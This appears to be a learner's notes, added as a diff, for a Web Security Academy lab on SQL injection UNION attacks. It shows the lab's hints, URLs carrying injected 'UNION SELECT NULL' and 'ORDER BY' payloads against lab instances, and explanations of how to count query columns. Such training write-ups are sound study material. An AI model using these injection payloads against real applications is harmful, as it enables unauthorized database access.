@@ -1,0 +1,37 @@
+This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the 
+application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to 
+determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct 
+the full attack.
+
+To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an 
+additional row containing null values.
+
+HINT:
+1. Use Burp Suite to intercept and modify the request that sets the product category filter.
+2. Modify the category parameter, giving it the value '+UNION+SELECT+NULL--. Observe that an error occurs.
+3. Modify the category parameter to add an additional column containing a null value: '+UNION+SELECT+NULL,NULL--
+4. Continue adding null values until the error disappears and the response includes additional content containing the null values.
+
+Way #1 (SELECT NULL,NULL--):
+https://0aab004b043aebbf81e625f300d800cf.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories%27%20UNION%20SELECT%20NULL,%20NULL,%20NULL--
+
+Queries:
+SELECT ? from table where category='Clothing, shoes and accessories' UNION SELECT NULL, NULL, NULL--
+
+UNION   This query will allow us to execute another query like SELECT as long it met the terms.
+
+The Condition to fullfill:
+1. The fields to be used in both the select statements must be in the same order, same number, and same data type.
+2. The Union clause produces distinct values in the result set, to fetch the duplicate values too UNION ALL must be used instead of just UNION.
+
+SELECT, NULL, NULL, NULL    This query usefull for testing if the table have 3 column, if it show error, then the table has more or 
+                            less than 3 column.
+
+
+way #2 (ORDER BY):
+https://0a16001103910be0801dcb5f00ea0006.web-security-academy.net/filter?category=Food+%26+Drink%27%20ORDER%20BY%204--
+
+SELECT ? from table where category='Food & Drink' ORDER BY 4--
+
+ORDER BY 4--    This query will sort the result. The number 4 specifies the position of the columns in the SQL query. So this would be error.
+                It is because there is less than 4 column which is 3 column. if we do ORDER BY 3-- it will work perfectly fine.
